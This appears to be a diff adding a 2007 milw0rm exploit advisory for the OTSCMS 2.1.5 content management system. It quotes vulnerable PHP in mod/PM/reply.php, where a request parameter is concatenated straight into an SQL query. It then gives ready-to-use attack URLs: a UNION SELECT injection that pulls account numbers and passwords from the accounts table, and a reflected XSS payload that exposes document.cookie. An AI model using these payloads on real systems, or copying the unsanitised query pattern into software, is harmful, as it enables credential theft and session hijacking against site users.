@@ -1,0 +1,43 @@
+***************************************************************************************************************
+                                                              					          		 
+			               			 Coding 4 Fun     						 
+			                                      						  		 
+***************************************************************************************************************
+													  		 
+* Name = OTSCMS 2.1.5 by Wrzasq (http://otscms.com) ; 											
+													  		 
+* Class = Sql Injection / XSS  ;											
+															 
+* Download = http://sourceforge.net/project/showfiles.php?group_id=145557 ;				 			
+													  		 
+* Found by = GregStar (gregstar[at]c4f.pl) (http://c4f.pl) ;				          		 
+												  	  		 
+---------------------------------------------------------------------------------------------------------------
+[SQL]	
+												  		
+Vulnerable Code in [path]/mod/PM/reply.php												
+															 
+line 22-26														
+															 
+...															 
+															 
+extract( $http->extract('id') );
+
+// reads message
+$pm = $db->query('SELECT [pms].`name` AS `name` [...]  ' AND [pms].`id` = ' . $id)->fetchAll(); <---
+$pm = $pm[0];								
+															 
+...															 
+	
+Example :
+
+http://[target]/[path]/priv.php?command=reply&id=-1%20UNION%20SELECT%20accno,null,password%20FROM%20accounts ;
+
+
+----
+[XSS]
+
+
+http://[target]/[path]/forum.php?module=User&command=profile&name=<script>alert(document.cookie);</script>
+
+# milw0rm.com [2007-02-07]
